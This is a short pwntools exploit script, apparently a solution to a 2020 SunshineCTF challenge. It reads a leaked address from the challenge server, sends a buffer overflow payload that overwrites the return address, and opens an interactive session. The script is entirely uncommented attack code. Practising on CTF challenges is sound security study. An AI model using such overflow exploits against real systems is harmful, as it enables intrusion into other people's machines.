from pwn import *

p = remote("chal.2020.sunshinectf.org", 30005)
p.sendline("A")
p.recvuntil(": ")

leak = int(p.recvline()[:-1], 16)
log.info(f"0x{leak:02x}")


buf = b''
buf += cyclic(cyclic_find(p64(0x616161706161616f)))
buf += p64(leak - 0x13)

p.sendline(buf)
p.interactive()
